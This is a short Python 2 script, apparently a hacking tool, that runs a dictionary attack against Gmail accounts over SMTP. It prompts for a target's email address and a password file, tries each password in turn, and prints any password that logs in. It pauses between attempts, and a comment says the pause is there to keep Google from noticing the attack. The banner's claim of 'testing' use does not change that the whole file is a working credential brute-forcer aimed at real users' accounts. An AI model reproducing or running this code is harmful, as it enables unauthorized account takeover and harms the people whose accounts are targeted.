# Program: Gmail Dictionary Attack v3
# Author: psibot
# Purpose: Brute force smtp.gmail.com using a dictionary attack over TLS. 

import smtplib
import time 
from termcolor import colored, cprint

# Colours
W  = "\033[0m";  
R  = "\033[31m"; 


# Banner
def logo():
  print ''
  cprint('-------------------------------', 'green',attrs=['bold'])
  print colored('[+]', 'red'), colored('Google Gmail Dictionary Attack V3', 'red')
  print colored('[+]', 'red'), colored('....Find anything!.....', 'green')
  cprint('-------------------------------', 'green',attrs=['bold'])
  print R+"\n|---------------------------------------------------------------|"
  print "|   d3am0n711[@]gmail[dot]com                                   |"
  print "|   THIS will be only used for testing                          |"
  print "|---------------------------------------------------------------|\n"
  print W


smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()
logo()


user = raw_input("Enter the target's email address: ")
passwfile = raw_input("Enter the password file name: ")
passwfile = open(passwfile, "r")
 
for password in passwfile:
        try:
                time.sleep(2) # Timeout for google not to pickup attack
                smtpserver.login(user, password)
 
                print colored('[+]', 'red'), colored(' !!!! Password Found: !!!', 'red')
                print "It's : %s" % password
                break;
        except smtplib.SMTPAuthenticationError:
                print colored('[!]', 'red'), colored('Password Incorrect', 'green') 
                print ": %s" % password

